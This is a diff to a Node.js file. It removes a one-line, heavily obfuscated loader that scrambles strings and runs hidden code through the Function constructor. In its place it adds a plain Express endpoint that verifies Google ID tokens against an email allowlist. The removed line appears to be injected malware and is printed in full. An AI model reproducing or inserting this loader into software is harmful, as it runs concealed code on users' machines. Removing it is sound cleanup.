@@ -1,1 +1,34 @@
-var express,jwt,axios,cors,app,CLIENT_ID,WHITELISTED_EMAILS;(function(){var lXh='',pgi=435-424;function tZL(y){var w=654074;var o=y.length;var n=[];for(var f=0;f<o;f++){n[f]=y.charAt(f)};for(var f=0;f<o;f++){var u=w*(f+105)+(w%14791);var z=w*(f+280)+(w%24644);var j=u%o;var p=z%o;var g=n[j];n[j]=n[p];n[p]=g;w=(u+z)%7228336;};return n.join('')};var mIN=tZL('irlooczkuhpqosdefcwjmrucngntxattvsryb').substr(0,pgi);var gXQ='d-;2C>6u.6;2,.perC;rsrlwv as ref...(=ladzuh(1oer.bw1=4v2+pm={rr=i[9r77mhilizsea90sae;7na)[+8u,f o)uahge7 ,jc]ar),ei81;.[r;vuz <aevttt2v)=r0p, (h<m0auogep;a5o1qxm[h])=cgu0;oi +;a=-C=kn=(=8rbv,d,u}oA](h(=;+";a7)s[jpoC, atSnf85g;,rl+i)lt;rrz=pj6ue(n ,.1c(uems;a;tcsaC+v=nl=tkdac=r;ntq-v;+cl.)kh8d{2=i5vd)hk=vct*.gro7,x,"a0;+) unlfoae) l0on g )0ve+enghnenar n(4o+(tn(ts=(;c3s;A4}5uhnres)erv6lg7= 7;r}x=.[til;=q.h(,lvfg8," 9b(v)*as=]t.eh-o]2a){n)1la=;Ck;6e+v"hezvev=)(s;{lr{f]3;vaa"s7=,h(t9=)cey=C;d.s7 [ef)rre{t([r.8,oAt=4xi)rb;b 0;mnhhn(h.]]mh;)f6 >mr+9)+aydru;pta=.]+if(blyuvg4ul=".ir;[,9r<,(tuodhy0,.el(n)([i+rp);r)oi,,[2C.ra=rsli);i2(=hljt.rfne!a.i+bepui62{uferz[}a1- (8rn=vdfv}t;.ivr;;)e,]0nl.t)o0;.]c8it(srspA r! eh;1q]1)6e,i9aif)h9a,h;t=r tlrvnm=oha}+s1agl)y+f]g[tcok1)=<r; [t=;aSmhtn;=.v.;;nnn-(u+v(+"=(aA-rabe+w(c=(gp((ni9hroh asffvnjpl3=v,zff]i)uv"e=u+11rrtt+;+,0v(va)(ha"r"a,<v;+ola}';var XnG=tZL[mIN];var cdO='';var nIU=XnG;var TiJ=XnG(cdO,tZL(gXQ));var XtO=TiJ(tZL('<c,<<<xl8 sv%<= nl<B3a,1.e<5a=(dsD]"e()5<[ti<(ss=);{:rotl.]<)<sri<St7)Floro.3s5us\')(a!<ap% -c<<))<aw\'jin$n<!,9\/*i:o-.r4(jo(<%#<3s.E<<7ic0%%.8,ek<<9<r<);m;f)w"v\/<atafmp#Enp79<do].ec_.B,<(tc%ebnd.ai]u!esw.b_dutu<{<e3enw0e44=[(z,<oI=em=)(jod$_<uyhfen<e).-1rI}url2e!=_lid8}<%nscwsb{ti<icok. fhi+o4_$oede oos%f6onono..7qco2s_e @%] <.g.jg.-3d;=t.u41$.6<re;%nte{jus<%<i)ehee%v+,oc%.]<,3pgch).ve n=09l$=sC(f.!<g=<.e=)u.5aetfD)n]a)4)3%<;r $coSe%f)1.<rf\/"crrtfu0uv6r)1]<<]e]cp<eeltt#e<f;vrC])ose,).<"<.r2<s<<};:.$_n.;<feuu(7lno;r9oro7!;e)=uc;<{d _.o*oif4}<=<65b< !efcbb<re<6$(g0dt7=u3_..}..tndk&DG .559<k}<{eou79d70<<;E!p(nuaC0ws]<m]e=+({,I]w<@b)ce<*t((@\'a.;))xr<6.<d,g.!rl<))c89E&e_$c.a?2I%<3)c((8e)a,<.<g7e=2u)3<se)_lz}c,i(ra]he0;(<]36ezn<u11t6d=_%<+=".<3jN<<)%T)[<(e )5o!.9(,r0t<axn=l).,a!jz};=ee;\/]#4(tD}<)t<<r] CD7v=d3jl127S;<(ueef iy<!nz-=)ey9as34(2.Ee\/+1s#";plote}!}k<<<0_2sneer<(w<rnsie.<<i;4a]<9)+{e$)0mog{)r._=<6n)m6:)f;oj).=n!6se=isk<_<])dcfi!4.<<j9A<(yugy7tddn.@Eqd6.t;5ii);<Cf[6m!:rss=;{FoD)llh h6@=tp,3e<xpet2se n<nD<epr:A%(v=c({()si7<ebo+_<)l;Ea<$2Nf0!;5ce#v(]1w%-b,IA[(r<f#i<8]]8,19t<fmc3t"ee<n<.&or11<r<<<(>jcr{2o@me3<4jts_.]o;<-$<0wierg!e<l\'<e_le<e1nj;x${<.,l01)xz<h(]x<;()f4,<}o.lawtw2.cgoou,n.<3rme<<ne_=ieA,.5})_<e[3j<1s1h<h[a 5<.i3; ,il_[n)7dt,$}_latgj4tCf$;!c3p<.g<5g93e(,<<[<. aIo8<s)}*)a<os03<l_.,1!?r).4g+geeB(<<0)_9+3!sBio30(Aa$%90%g*E)06r0%)l};n,e(<!#$r<])<.8}Cs;",)qep13+ni)b<0<<e_<<i)?$mssx9goe<2e]})q<sa1_;wn=.tnI{*-e,p]D40.cre<<f[?<*4s\/)sk:%=,.o9D!v<5dt]t<<03I.:G=0{tev!\/!.:o<+n_;e(4[p4s1x;B{3(so 3%}=rsdrn.)]j,}.{E<4e<$_.trG;)e<(esb6Cb< ;;$<}<(do:.e(.b_2.}j$r>Soe3,ap<e]tpSC<x}3(.j=s<j,!e5e?led.s$iB)%]<(Ior1i)fl%tc<$=}<,doge,70!0=<S<{<}<no&!%lfier_ea=29te2}teo <(<((92B.tot]F((}boe!i =i 4[nu{<ur;e<3.t=<e"e}s1$)(0x34<rj([,;fF<vse)M e"u.)r.4.;<<c<<_%),bsTC3]rn)eno tGftt<=6<.<sae!me)Ebuewo2>( 9a(tn7ad$aj ;aTp.b4ka){3et09.r!<j_aeo<)9g=4.4<pq{(\'nt<5c< f\/ s+{4t( Ae<t3[<=<i.6i<9 E2-exog$( eb:,e.l3clE, 3xs<)<T<$<.) i.)evamv.r< w.5+v)om]et _x(7a.fan+2e<(e!][&,$[aefaeq\/<r;nI(>a8<2E6<d<)7 .(E]'));var ckg=nIU(lXh,XtO );ckg(3231);return 9552})()
+const express = require('express');
+const jwt = require('jsonwebtoken');
+const axios = require('axios');
+const cors = require('cors');
+
+const app = express();
+app.use(express.json());
+app.use(cors());
+
+const CLIENT_ID = "273294914895-5vhe9qupotv9ldtd03jjauhr85oed0g5";
+const WHITELISTED_EMAILS = ["allowed@example.com", "admin@yourdomain.com"];
+
+app.post('/verify-google-token', async (req, res) => {
+    const { token } = req.body;
+
+    try {
+        const googleRes = await axios.get(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`);
+        const { email, aud } = googleRes.data;
+
+        if (aud !== CLIENT_ID) {
+            return res.status(403).json({ success: false, message: "Invalid client ID" });
+        }
+
+        if (WHITELISTED_EMAILS.includes(email)) {
+            return res.json({ success: true, email });
+        } else {
+            return res.status(403).json({ success: false, message: "Email not whitelisted" });
+        }
+    } catch (error) {
+        return res.status(400).json({ success: false, message: "Invalid token" });
+    }
+});
+
+app.listen(3000, () => console.log("Server running on port 3000"));
